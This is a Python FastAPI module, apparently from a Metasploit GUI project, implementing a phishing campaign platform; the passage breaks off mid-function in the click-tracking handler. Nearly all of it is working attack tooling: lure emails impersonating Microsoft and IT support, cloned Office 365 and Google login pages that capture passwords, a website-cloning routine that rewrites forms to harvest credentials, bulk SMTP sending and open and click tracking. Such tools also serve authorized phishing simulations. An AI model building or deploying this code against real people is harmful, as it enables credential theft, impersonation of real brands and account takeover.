"""
Phishing Campaign Management API
- Campaign CRUD
- Email templates
- Target management
- Credential harvesting
- Website cloning
- Tracking & analytics
"""

from fastapi import APIRouter, HTTPException, Request, Response
from fastapi.responses import HTMLResponse
from pydantic import BaseModel, EmailStr
from typing import Optional, List
from datetime import datetime
import uuid
import json
import os
import hashlib
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import httpx
from bs4 import BeautifulSoup
import re
from urllib.parse import urljoin, urlparse
import asyncio
import base64

router = APIRouter()

# Data storage paths
DATA_DIR = "/tmp/msf_gui_phishing"
CAMPAIGNS_FILE = f"{DATA_DIR}/campaigns.json"
TEMPLATES_FILE = f"{DATA_DIR}/templates.json"
TARGETS_FILE = f"{DATA_DIR}/targets.json"
CREDENTIALS_FILE = f"{DATA_DIR}/captured_creds.json"
SMTP_CONFIG_FILE = f"{DATA_DIR}/smtp_config.json"
LANDING_PAGES_DIR = f"{DATA_DIR}/landing_pages"

# Ensure directories exist
os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(LANDING_PAGES_DIR, exist_ok=True)


# ============== Models ==============

class SMTPConfig(BaseModel):
    host: str
    port: int = 587
    username: str
    password: str
    from_email: str
    from_name: str = "IT Support"
    use_tls: bool = True


class EmailTemplate(BaseModel):
    id: Optional[str] = None
    name: str
    subject: str
    body_html: str
    body_text: Optional[str] = None
    category: str = "generic"  # generic, credential, malware, awareness
    created_at: Optional[str] = None
    updated_at: Optional[str] = None


class PhishingTarget(BaseModel):
    id: Optional[str] = None
    email: str
    first_name: Optional[str] = None
    last_name: Optional[str] = None
    position: Optional[str] = None
    department: Optional[str] = None
    custom_fields: Optional[dict] = None


class TargetGroup(BaseModel):
    id: Optional[str] = None
    name: str
    description: Optional[str] = None
    targets: List[PhishingTarget] = []
    created_at: Optional[str] = None


class LandingPage(BaseModel):
    id: Optional[str] = None
    name: str
    html_content: str
    capture_credentials: bool = True
    capture_fields: List[str] = ["username", "password"]
    redirect_url: Optional[str] = None
    cloned_from: Optional[str] = None
    created_at: Optional[str] = None


class Campaign(BaseModel):
    id: Optional[str] = None
    name: str
    description: Optional[str] = None
    status: str = "draft"  # draft, scheduled, running, paused, completed
    template_id: str
    landing_page_id: Optional[str] = None
    target_group_id: str
    smtp_config_id: Optional[str] = None

    # Scheduling
    scheduled_at: Optional[str] = None
    send_interval_seconds: int = 5  # Delay between emails

    # Tracking
    track_opens: bool = True
    track_clicks: bool = True

    # Stats
    total_targets: int = 0
    emails_sent: int = 0
    emails_opened: int = 0
    links_clicked: int = 0
    credentials_captured: int = 0

    created_at: Optional[str] = None
    updated_at: Optional[str] = None
    completed_at: Optional[str] = None


class CapturedCredential(BaseModel):
    id: Optional[str] = None
    campaign_id: str
    target_id: str
    target_email: str
    username: Optional[str] = None
    password: Optional[str] = None
    other_fields: Optional[dict] = None
    ip_address: str
    user_agent: str
    captured_at: str


class TrackingEvent(BaseModel):
    id: Optional[str] = None
    campaign_id: str
    target_id: str
    event_type: str  # email_sent, email_opened, link_clicked, creds_submitted
    ip_address: Optional[str] = None
    user_agent: Optional[str] = None
    timestamp: str


# ============== Helper Functions ==============

def load_json(filepath: str, default=None):
    if default is None:
        default = []
    try:
        if os.path.exists(filepath):
            with open(filepath, 'r') as f:
                return json.load(f)
    except Exception:
        pass
    return default


def save_json(filepath: str, data):
    with open(filepath, 'w') as f:
        json.dump(data, f, indent=2)


def generate_tracking_id(campaign_id: str, target_id: str) -> str:
    """Generate a unique tracking ID for a target in a campaign"""
    data = f"{campaign_id}:{target_id}"
    return base64.urlsafe_b64encode(hashlib.sha256(data.encode()).digest()[:12]).decode()


def decode_tracking_id(tracking_id: str) -> tuple:
    """This is a simplified version - in production, store mapping in DB"""
    # For now, we'll store the mapping
    mappings = load_json(f"{DATA_DIR}/tracking_mappings.json", {})
    return mappings.get(tracking_id, (None, None))


def store_tracking_mapping(tracking_id: str, campaign_id: str, target_id: str):
    mappings = load_json(f"{DATA_DIR}/tracking_mappings.json", {})
    mappings[tracking_id] = [campaign_id, target_id]
    save_json(f"{DATA_DIR}/tracking_mappings.json", mappings)


def render_template(template_html: str, target: dict, campaign: dict, tracking_id: str, base_url: str) -> str:
    """Render email template with variables"""
    variables = {
        "{{first_name}}": target.get("first_name", "User"),
        "{{last_name}}": target.get("last_name", ""),
        "{{email}}": target.get("email", ""),
        "{{position}}": target.get("position", ""),
        "{{department}}": target.get("department", ""),
        "{{company}}": campaign.get("company", "Company"),
        "{{tracking_url}}": f"{base_url}/api/v1/phishing/track/{tracking_id}/click",
        "{{tracking_pixel}}": f'<img src="{base_url}/api/v1/phishing/track/{tracking_id}/open" width="1" height="1" />',
    }

    result = template_html
    for var, value in variables.items():
        result = result.replace(var, str(value))

    return result


# ============== SMTP Configuration ==============

@router.get("/smtp")
async def get_smtp_configs():
    """Get all SMTP configurations"""
    configs = load_json(SMTP_CONFIG_FILE, [])
    # Hide passwords
    for config in configs:
        config["password"] = "********"
    return {"configs": configs}


@router.post("/smtp")
async def create_smtp_config(config: SMTPConfig):
    """Create or update SMTP configuration"""
    configs = load_json(SMTP_CONFIG_FILE, [])

    config_dict = config.model_dump()
    config_dict["id"] = str(uuid.uuid4())
    config_dict["created_at"] = datetime.now().isoformat()

    configs.append(config_dict)
    save_json(SMTP_CONFIG_FILE, configs)

    config_dict["password"] = "********"
    return config_dict


@router.post("/smtp/test")
async def test_smtp_config(config: SMTPConfig):
    """Test SMTP configuration"""
    try:
        context = ssl.create_default_context()

        if config.use_tls:
            server = smtplib.SMTP(config.host, config.port)
            server.starttls(context=context)
        else:
            server = smtplib.SMTP_SSL(config.host, config.port, context=context)

        server.login(config.username, config.password)
        server.quit()

        return {"success": True, "message": "SMTP connection successful"}
    except Exception as e:
        return {"success": False, "message": str(e)}


# ============== Email Templates ==============

@router.get("/templates")
async def get_templates(category: Optional[str] = None):
    """Get all email templates"""
    templates = load_json(TEMPLATES_FILE, [])

    if category:
        templates = [t for t in templates if t.get("category") == category]

    return {"templates": templates, "count": len(templates)}


@router.get("/templates/prebuilt")
async def get_prebuilt_templates():
    """Get prebuilt phishing templates"""
    prebuilt = [
        {
            "id": "password_reset",
            "name": "Password Reset Required",
            "subject": "Action Required: Password Reset",
            "category": "credential",
            "body_html": """
<html>
<body style="font-family: Arial, sans-serif; padding: 20px;">
<div style="max-width: 600px; margin: 0 auto; border: 1px solid #ddd; padding: 20px;">
    <h2 style="color: #333;">Password Reset Required</h2>
    <p>Dear {{first_name}},</p>
    <p>We've detected unusual activity on your account. For your security, please reset your password immediately.</p>
    <p style="text-align: center; margin: 30px 0;">
        <a href="{{tracking_url}}" style="background-color: #007bff; color: white; padding: 12px 30px; text-decoration: none; border-radius: 5px;">Reset Password Now</a>
    </p>
    <p>If you did not request this reset, please contact IT support immediately.</p>
    <p>Thank you,<br>IT Security Team</p>
</div>
{{tracking_pixel}}
</body>
</html>
"""
        },
        {
            "id": "office365_login",
            "name": "Office 365 Session Expired",
            "subject": "Your Office 365 session has expired",
            "category": "credential",
            "body_html": """
<html>
<body style="font-family: 'Segoe UI', Arial, sans-serif; padding: 20px; background-color: #f5f5f5;">
<div style="max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 4px;">
    <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" width="108" height="24" alt="Microsoft">
    <hr style="border: none; border-top: 1px solid #eee; margin: 20px 0;">
    <p>Hi {{first_name}},</p>
    <p>Your Office 365 session has expired. Please sign in again to continue accessing your email and documents.</p>
    <p style="text-align: center; margin: 30px 0;">
        <a href="{{tracking_url}}" style="background-color: #0078d4; color: white; padding: 10px 25px; text-decoration: none; border-radius: 2px;">Sign In</a>
    </p>
    <p style="color: #666; font-size: 12px;">This is an automated message from Microsoft Office 365.</p>
</div>
{{tracking_pixel}}
</body>
</html>
"""
        },
        {
            "id": "document_shared",
            "name": "Document Shared With You",
            "subject": "{{first_name}}, a document was shared with you",
            "category": "credential",
            "body_html": """
<html>
<body style="font-family: Arial, sans-serif; padding: 20px; background-color: #f0f0f0;">
<div style="max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
    <h2 style="color: #1a73e8; margin-bottom: 20px;">Document Shared</h2>
    <p>Hi {{first_name}},</p>
    <p><strong>HR Department</strong> has shared a document with you:</p>
    <div style="background: #f8f9fa; padding: 15px; border-radius: 4px; margin: 20px 0;">
        <p style="margin: 0;"><strong>Q4 Performance Review.pdf</strong></p>
        <p style="margin: 5px 0 0 0; color: #666; font-size: 14px;">Click below to view the document</p>
    </div>
    <p style="text-align: center;">
        <a href="{{tracking_url}}" style="background-color: #1a73e8; color: white; padding: 12px 30px; text-decoration: none; border-radius: 4px; display: inline-block;">Open Document</a>
    </p>
</div>
{{tracking_pixel}}
</body>
</html>
"""
        },
        {
            "id": "it_support",
            "name": "IT Support - Account Verification",
            "subject": "Urgent: Account Verification Required",
            "category": "credential",
            "body_html": """
<html>
<body style="font-family: Arial, sans-serif; padding: 20px;">
<div style="max-width: 600px; margin: 0 auto;">
    <h2>IT Support - Account Verification</h2>
    <p>Dear {{first_name}} {{last_name}},</p>
    <p>As part of our security audit, we need to verify your account credentials. Please click the link below to confirm your identity:</p>
    <p><a href="{{tracking_url}}">Verify Account</a></p>
    <p>This verification must be completed within 24 hours to avoid account suspension.</p>
    <p>Best regards,<br>IT Support Team<br>{{company}}</p>
    <hr>
    <p style="font-size: 11px; color: #666;">This email was sent to {{email}}. If you have questions, contact helpdesk@{{company}}.com</p>
</div>
{{tracking_pixel}}
</body>
</html>
"""
        },
        {
            "id": "invoice_attached",
            "name": "Invoice Attached",
            "subject": "Invoice #{{invoice_number}} - Payment Required",
            "category": "malware",
            "body_html": """
<html>
<body style="font-family: Arial, sans-serif; padding: 20px;">
<div style="max-width: 600px; margin: 0 auto; border: 1px solid #ddd; padding: 20px;">
    <h2>Invoice Notification</h2>
    <p>Dear {{first_name}},</p>
    <p>Please find attached the invoice for your recent order. The payment is due within 30 days.</p>
    <table style="width: 100%; margin: 20px 0; border-collapse: collapse;">
        <tr style="background: #f5f5f5;">
            <td style="padding: 10px; border: 1px solid #ddd;"><strong>Invoice #</strong></td>
            <td style="padding: 10px; border: 1px solid #ddd;">INV-2024-{{invoice_number}}</td>
        </tr>
        <tr>
            <td style="padding: 10px; border: 1px solid #ddd;"><strong>Amount Due</strong></td>
            <td style="padding: 10px; border: 1px solid #ddd;">$1,250.00</td>
        </tr>
    </table>
    <p><a href="{{tracking_url}}" style="color: #007bff;">Download Invoice (PDF)</a></p>
    <p>Thank you for your business.</p>
</div>
{{tracking_pixel}}
</body>
</html>
"""
        },
        {
            "id": "security_alert",
            "name": "Security Alert - New Login",
            "subject": "Security Alert: New sign-in to your account",
            "category": "credential",
            "body_html": """
<html>
<body style="font-family: Arial, sans-serif; padding: 20px; background: #f5f5f5;">
<div style="max-width: 600px; margin: 0 auto; background: white; padding: 30px;">
    <h2 style="color: #d93025;">⚠️ Security Alert</h2>
    <p>Hi {{first_name}},</p>
    <p>We noticed a new sign-in to your account:</p>
    <div style="background: #fce8e6; padding: 15px; border-radius: 4px; margin: 20px 0;">
        <p style="margin: 0;"><strong>Device:</strong> Windows PC</p>
        <p style="margin: 5px 0;"><strong>Location:</strong> Unknown Location</p>
        <p style="margin: 0;"><strong>Time:</strong> Just now</p>
    </div>
    <p>If this wasn't you, your account may be compromised. Secure your account immediately:</p>
    <p style="text-align: center;">
        <a href="{{tracking_url}}" style="background-color: #d93025; color: white; padding: 12px 30px; text-decoration: none; border-radius: 4px;">Secure Account</a>
    </p>
    <p>If this was you, you can ignore this email.</p>
</div>
{{tracking_pixel}}
</body>
</html>
"""
        }
    ]
    return {"templates": prebuilt}


@router.post("/templates")
async def create_template(template: EmailTemplate):
    """Create a new email template"""
    templates = load_json(TEMPLATES_FILE, [])

    template_dict = template.model_dump()
    template_dict["id"] = str(uuid.uuid4())
    template_dict["created_at"] = datetime.now().isoformat()
    template_dict["updated_at"] = template_dict["created_at"]

    templates.append(template_dict)
    save_json(TEMPLATES_FILE, templates)

    return template_dict


@router.put("/templates/{template_id}")
async def update_template(template_id: str, template: EmailTemplate):
    """Update an email template"""
    templates = load_json(TEMPLATES_FILE, [])

    for i, t in enumerate(templates):
        if t["id"] == template_id:
            template_dict = template.model_dump()
            template_dict["id"] = template_id
            template_dict["created_at"] = t.get("created_at")
            template_dict["updated_at"] = datetime.now().isoformat()
            templates[i] = template_dict
            save_json(TEMPLATES_FILE, templates)
            return template_dict

    raise HTTPException(status_code=404, detail="Template not found")


@router.delete("/templates/{template_id}")
async def delete_template(template_id: str):
    """Delete an email template"""
    templates = load_json(TEMPLATES_FILE, [])
    templates = [t for t in templates if t["id"] != template_id]
    save_json(TEMPLATES_FILE, templates)
    return {"success": True}


# ============== Target Groups ==============

@router.get("/targets")
async def get_target_groups():
    """Get all target groups"""
    groups = load_json(TARGETS_FILE, [])
    return {"groups": groups, "count": len(groups)}


@router.post("/targets")
async def create_target_group(group: TargetGroup):
    """Create a new target group"""
    groups = load_json(TARGETS_FILE, [])

    group_dict = group.model_dump()
    group_dict["id"] = str(uuid.uuid4())
    group_dict["created_at"] = datetime.now().isoformat()

    # Assign IDs to targets
    for target in group_dict["targets"]:
        if not target.get("id"):
            target["id"] = str(uuid.uuid4())

    groups.append(group_dict)
    save_json(TARGETS_FILE, groups)

    return group_dict


@router.post("/targets/{group_id}/import")
async def import_targets_csv(group_id: str, request: Request):
    """Import targets from CSV data"""
    groups = load_json(TARGETS_FILE, [])

    group = next((g for g in groups if g["id"] == group_id), None)
    if not group:
        raise HTTPException(status_code=404, detail="Group not found")

    body = await request.json()
    csv_data = body.get("csv_data", "")

    # Parse CSV (simple parser)
    lines = csv_data.strip().split("\n")
    if not lines:
        return {"imported": 0}

    # First line is header
    headers = [h.strip().lower() for h in lines[0].split(",")]

    imported = 0
    for line in lines[1:]:
        if not line.strip():
            continue

        values = [v.strip() for v in line.split(",")]
        target = {"id": str(uuid.uuid4())}

        for i, header in enumerate(headers):
            if i < len(values):
                if header in ["email", "first_name", "last_name", "position", "department"]:
                    target[header] = values[i]

        if target.get("email"):
            group["targets"].append(target)
            imported += 1

    save_json(TARGETS_FILE, groups)
    return {"imported": imported, "total": len(group["targets"])}


@router.delete("/targets/{group_id}")
async def delete_target_group(group_id: str):
    """Delete a target group"""
    groups = load_json(TARGETS_FILE, [])
    groups = [g for g in groups if g["id"] != group_id]
    save_json(TARGETS_FILE, groups)
    return {"success": True}


# ============== Landing Pages ==============

@router.get("/landing-pages")
async def get_landing_pages():
    """Get all landing pages"""
    pages_file = f"{DATA_DIR}/landing_pages.json"
    pages = load_json(pages_file, [])
    return {"pages": pages, "count": len(pages)}


@router.get("/landing-pages/prebuilt")
async def get_prebuilt_landing_pages():
    """Get prebuilt landing page templates"""
    prebuilt = [
        {
            "id": "office365",
            "name": "Office 365 Login",
            "capture_fields": ["email", "password"],
            "html_content": """
<!DOCTYPE html>
<html>
<head>
    <title>Sign in to your account</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f5f5f5; margin: 0; padding: 40px; }
        .container { max-width: 440px; margin: 0 auto; background: white; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
        .logo { margin-bottom: 20px; }
        h1 { font-size: 24px; font-weight: 600; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #666; box-sizing: border-box; font-size: 15px; }
        input:focus { border-color: #0067b8; outline: none; }
        button { width: 100%; padding: 12px; background: #0067b8; color: white; border: none; font-size: 15px; cursor: pointer; margin-top: 20px; }
        button:hover { background: #005a9e; }
        .links { margin-top: 20px; font-size: 13px; }
        .links a { color: #0067b8; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" class="logo" width="108">
        <h1>Sign in</h1>
        <form method="POST" action="/api/v1/phishing/capture/{{page_id}}">
            <input type="hidden" name="tracking_id" value="{{tracking_id}}">
            <input type="email" name="email" placeholder="Email, phone, or Skype" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign in</button>
        </form>
        <div class="links">
            <a href="#">Can't access your account?</a>
        </div>
    </div>
</body>
</html>
"""
        },
        {
            "id": "google",
            "name": "Google Sign In",
            "capture_fields": ["email", "password"],
            "html_content": """
<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <style>
        body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #fff; margin: 0; padding: 40px; }
        .container { max-width: 450px; margin: 0 auto; border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px; }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo img { height: 24px; }
        h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; }
        .subtitle { text-align: center; color: #202124; margin-bottom: 32px; }
        input { width: 100%; padding: 13px 15px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        input:focus { border-color: #1a73e8; outline: none; box-shadow: 0 0 0 1px #1a73e8; }
        .forgot { margin: 20px 0; }
        .forgot a { color: #1a73e8; text-decoration: none; font-size: 14px; }
        .buttons { display: flex; justify-content: space-between; margin-top: 32px; }
        .btn-create { color: #1a73e8; background: none; border: none; font-size: 14px; cursor: pointer; padding: 10px; }
        .btn-next { background: #1a73e8; color: white; border: none; border-radius: 4px; padding: 10px 24px; font-size: 14px; cursor: pointer; }
        .btn-next:hover { background: #1557b0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 75 24" width="75" height="24"><path d="M0 19.5V4.5h4.5v15z" fill="#4285F4"/></svg>
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" height="24">
        </div>
        <h1>Sign in</h1>
        <p class="subtitle">Use your Google Account</p>
        <form method="POST" action="/api/v1/phishing/capture/{{page_id}}">
            <input type="hidden" name="tracking_id" value="{{tracking_id}}">
            <input type="email" name="email" placeholder="Email or phone" required>
            <input type="password" name="password" placeholder="Enter your password" required>
            <div class="forgot"><a href="#">Forgot email?</a></div>
            <div class="buttons">
                <button type="button" class="btn-create">Create account</button>
                <button type="submit" class="btn-next">Next</button>
            </div>
        </form>
    </div>
</body>
</html>
"""
        },
        {
            "id": "generic_login",
            "name": "Generic Corporate Login",
            "capture_fields": ["username", "password"],
            "html_content": """
<!DOCTYPE html>
<html>
<head>
    <title>Corporate Portal - Login</title>
    <style>
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); margin: 0; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 10px 40px rgba(0,0,0,0.3); width: 100%; max-width: 400px; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h2 { color: #1e3c72; margin: 0; }
        h1 { font-size: 20px; text-align: center; color: #333; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #555; font-size: 14px; }
        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
        input:focus { border-color: #1e3c72; outline: none; }
        button { width: 100%; padding: 14px; background: #1e3c72; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; margin-top: 10px; }
        button:hover { background: #2a5298; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><h2>🏢 Corporate Portal</h2></div>
        <h1>Sign in to your account</h1>
        <form method="POST" action="/api/v1/phishing/capture/{{page_id}}">
            <input type="hidden" name="tracking_id" value="{{tracking_id}}">
            <div class="form-group">
                <label>Username</label>
                <input type="text" name="username" required>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" required>
            </div>
            <button type="submit">Sign In</button>
        </form>
        <p class="footer">© 2024 Corporate Inc. All rights reserved.</p>
    </div>
</body>
</html>
"""
        }
    ]
    return {"pages": prebuilt}


@router.post("/landing-pages")
async def create_landing_page(page: LandingPage):
    """Create a new landing page"""
    pages_file = f"{DATA_DIR}/landing_pages.json"
    pages = load_json(pages_file, [])

    page_dict = page.model_dump()
    page_dict["id"] = str(uuid.uuid4())
    page_dict["created_at"] = datetime.now().isoformat()

    # Save HTML file
    html_path = f"{LANDING_PAGES_DIR}/{page_dict['id']}.html"
    with open(html_path, 'w') as f:
        f.write(page_dict["html_content"])

    pages.append(page_dict)
    save_json(pages_file, pages)

    return page_dict


@router.post("/landing-pages/clone")
async def clone_website(request: Request):
    """Clone a website for phishing"""
    body = await request.json()
    url = body.get("url")
    name = body.get("name", "Cloned Page")

    if not url:
        raise HTTPException(status_code=400, detail="URL is required")

    try:
        async with httpx.AsyncClient(follow_redirects=True, timeout=30) as client:
            response = await client.get(url)
            html = response.text

        # Parse and modify HTML
        soup = BeautifulSoup(html, 'html.parser')

        # Convert relative URLs to absolute
        base_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"

        for tag in soup.find_all(['img', 'script', 'link']):
            for attr in ['src', 'href']:
                if tag.get(attr) and not tag[attr].startswith(('http://', 'https://', 'data:')):
                    tag[attr] = urljoin(base_url, tag[attr])

        # Modify forms to capture credentials
        for form in soup.find_all('form'):
            form['action'] = '/api/v1/phishing/capture/{{page_id}}'
            form['method'] = 'POST'

            # Add tracking ID hidden field
            tracking_input = soup.new_tag('input')
            tracking_input['type'] = 'hidden'
            tracking_input['name'] = 'tracking_id'
            tracking_input['value'] = '{{tracking_id}}'
            form.insert(0, tracking_input)

        cloned_html = str(soup)

        # Create landing page
        page = LandingPage(
            name=name,
            html_content=cloned_html,
            capture_credentials=True,
            capture_fields=["username", "email", "password"],
            cloned_from=url
        )

        return await create_landing_page(page)

    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to clone website: {str(e)}")


@router.delete("/landing-pages/{page_id}")
async def delete_landing_page(page_id: str):
    """Delete a landing page"""
    pages_file = f"{DATA_DIR}/landing_pages.json"
    pages = load_json(pages_file, [])
    pages = [p for p in pages if p["id"] != page_id]
    save_json(pages_file, pages)

    # Delete HTML file
    html_path = f"{LANDING_PAGES_DIR}/{page_id}.html"
    if os.path.exists(html_path):
        os.remove(html_path)

    return {"success": True}


# ============== Campaigns ==============

@router.get("/campaigns")
async def get_campaigns(status: Optional[str] = None):
    """Get all campaigns"""
    campaigns = load_json(CAMPAIGNS_FILE, [])

    if status:
        campaigns = [c for c in campaigns if c.get("status") == status]

    return {"campaigns": campaigns, "count": len(campaigns)}


@router.get("/campaigns/{campaign_id}")
async def get_campaign(campaign_id: str):
    """Get campaign details"""
    campaigns = load_json(CAMPAIGNS_FILE, [])
    campaign = next((c for c in campaigns if c["id"] == campaign_id), None)

    if not campaign:
        raise HTTPException(status_code=404, detail="Campaign not found")

    return campaign


@router.post("/campaigns")
async def create_campaign(campaign: Campaign):
    """Create a new campaign"""
    campaigns = load_json(CAMPAIGNS_FILE, [])

    # Get target group to count targets
    groups = load_json(TARGETS_FILE, [])
    group = next((g for g in groups if g["id"] == campaign.target_group_id), None)

    campaign_dict = campaign.model_dump()
    campaign_dict["id"] = str(uuid.uuid4())
    campaign_dict["created_at"] = datetime.now().isoformat()
    campaign_dict["updated_at"] = campaign_dict["created_at"]
    campaign_dict["total_targets"] = len(group["targets"]) if group else 0

    campaigns.append(campaign_dict)
    save_json(CAMPAIGNS_FILE, campaigns)

    return campaign_dict


@router.post("/campaigns/{campaign_id}/launch")
async def launch_campaign(campaign_id: str, request: Request):
    """Launch a phishing campaign"""
    body = await request.json()
    base_url = body.get("base_url", "http://localhost:8000")

    campaigns = load_json(CAMPAIGNS_FILE, [])
    campaign = next((c for c in campaigns if c["id"] == campaign_id), None)

    if not campaign:
        raise HTTPException(status_code=404, detail="Campaign not found")

    # Get template
    templates = load_json(TEMPLATES_FILE, [])

    # Check prebuilt templates
    prebuilt = (await get_prebuilt_templates())["templates"]
    template = next((t for t in templates if t["id"] == campaign["template_id"]), None)
    if not template:
        template = next((t for t in prebuilt if t["id"] == campaign["template_id"]), None)

    if not template:
        raise HTTPException(status_code=404, detail="Template not found")

    # Get target group
    groups = load_json(TARGETS_FILE, [])
    group = next((g for g in groups if g["id"] == campaign["target_group_id"]), None)

    if not group or not group["targets"]:
        raise HTTPException(status_code=400, detail="No targets in group")

    # Get SMTP config
    smtp_configs = load_json(SMTP_CONFIG_FILE, [])
    smtp_config = smtp_configs[0] if smtp_configs else None

    if not smtp_config:
        raise HTTPException(status_code=400, detail="No SMTP configuration found")

    # Update campaign status
    campaign["status"] = "running"
    campaign["updated_at"] = datetime.now().isoformat()
    save_json(CAMPAIGNS_FILE, campaigns)

    # Send emails in background
    asyncio.create_task(send_campaign_emails(
        campaign, template, group["targets"], smtp_config, base_url
    ))

    return {"success": True, "message": f"Campaign launched to {len(group['targets'])} targets"}


async def send_campaign_emails(campaign: dict, template: dict, targets: list, smtp_config: dict, base_url: str):
    """Background task to send campaign emails"""
    campaigns = load_json(CAMPAIGNS_FILE, [])

    try:
        context = ssl.create_default_context()

        if smtp_config.get("use_tls", True):
            server = smtplib.SMTP(smtp_config["host"], smtp_config["port"])
            server.starttls(context=context)
        else:
            server = smtplib.SMTP_SSL(smtp_config["host"], smtp_config["port"], context=context)

        server.login(smtp_config["username"], smtp_config["password"])

        for target in targets:
            try:
                # Generate tracking ID
                tracking_id = generate_tracking_id(campaign["id"], target["id"])
                store_tracking_mapping(tracking_id, campaign["id"], target["id"])

                # Render template
                html_content = render_template(
                    template["body_html"],
                    target,
                    campaign,
                    tracking_id,
                    base_url
                )

                # Create email
                msg = MIMEMultipart("alternative")
                msg["Subject"] = render_template(template["subject"], target, campaign, tracking_id, base_url)
                msg["From"] = f"{smtp_config.get('from_name', 'IT Support')} <{smtp_config['from_email']}>"
                msg["To"] = target["email"]

                # Add HTML part
                msg.attach(MIMEText(html_content, "html"))

                # Send
                server.sendmail(smtp_config["from_email"], target["email"], msg.as_string())

                # Update stats
                campaign["emails_sent"] += 1

                # Log event
                log_tracking_event(campaign["id"], target["id"], "email_sent")

                # Delay between emails
                await asyncio.sleep(campaign.get("send_interval_seconds", 5))

            except Exception as e:
                print(f"Failed to send to {target['email']}: {e}")

        server.quit()

        # Update campaign status
        campaign["status"] = "completed"
        campaign["completed_at"] = datetime.now().isoformat()

    except Exception as e:
        campaign["status"] = "failed"
        campaign["error"] = str(e)

    campaign["updated_at"] = datetime.now().isoformat()

    # Save updated campaign
    for i, c in enumerate(campaigns):
        if c["id"] == campaign["id"]:
            campaigns[i] = campaign
            break
    save_json(CAMPAIGNS_FILE, campaigns)


def log_tracking_event(campaign_id: str, target_id: str, event_type: str, ip_address: str = None, user_agent: str = None):
    """Log a tracking event"""
    events_file = f"{DATA_DIR}/tracking_events.json"
    events = load_json(events_file, [])

    events.append({
        "id": str(uuid.uuid4()),
        "campaign_id": campaign_id,
        "target_id": target_id,
        "event_type": event_type,
        "ip_address": ip_address,
        "user_agent": user_agent,
        "timestamp": datetime.now().isoformat()
    })

    save_json(events_file, events)


@router.post("/campaigns/{campaign_id}/pause")
async def pause_campaign(campaign_id: str):
    """Pause a running campaign"""
    campaigns = load_json(CAMPAIGNS_FILE, [])

    for campaign in campaigns:
        if campaign["id"] == campaign_id:
            campaign["status"] = "paused"
            campaign["updated_at"] = datetime.now().isoformat()
            save_json(CAMPAIGNS_FILE, campaigns)
            return {"success": True}

    raise HTTPException(status_code=404, detail="Campaign not found")


@router.delete("/campaigns/{campaign_id}")
async def delete_campaign(campaign_id: str):
    """Delete a campaign"""
    campaigns = load_json(CAMPAIGNS_FILE, [])
    campaigns = [c for c in campaigns if c["id"] != campaign_id]
    save_json(CAMPAIGNS_FILE, campaigns)
    return {"success": True}


# ============== Tracking & Capture ==============

@router.get("/track/{tracking_id}/open")
async def track_email_open(tracking_id: str, request: Request):
    """Track email open (1x1 pixel)"""
    campaign_id, target_id = decode_tracking_id(tracking_id)

    if campaign_id:
        log_tracking_event(
            campaign_id, target_id, "email_opened",
            request.client.host if request.client else None,
            request.headers.get("user-agent")
        )

        # Update campaign stats
        campaigns = load_json(CAMPAIGNS_FILE, [])
        for campaign in campaigns:
            if campaign["id"] == campaign_id:
                campaign["emails_opened"] = campaign.get("emails_opened", 0) + 1
                save_json(CAMPAIGNS_FILE, campaigns)
                break

    # Return 1x1 transparent GIF
    gif = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")
    return Response(content=gif, media_type="image/gif")


@router.get("/track/{tracking_id}/click")
async def track_link_click(tracking_id: str, request: Request):
    """Track link click and redirect to landing page"""
    campaign_id, target_id = decode_tracking_id(tracking_id)

    if campaign_id:
        log_tracking_event(
            campaign_id, target_id, "link_clicked",
            request.client.host if request.client else None,
            request.headers.get("user-agent")
        )

        # Update campaign stats
        campaigns = load_json(CAMPAIGNS_FILE, [])
        campaign = None
        for c in campaigns:
            if c["id"] == campaign_id:
                c["links_clicked"] = c.get("links_clicked", 0) + 1
                campaign = c
                save_json(CAMPAIGNS_FILE, campaigns)
                break

        # Get landing page
        if campaign and campaign.get("landing_page_id"):
            pages_file = f"{DATA_DIR}/landing_pages.json"
            pages = load_json(pages_file, [])

            # Check custom pages
            page = next((p for p in pages if p["id"] == campaign["landing_page_id"]), None)

            # Check prebuilt pages
            if not page:
                prebuilt = (await get_prebuilt_landing_pages())["pages"]
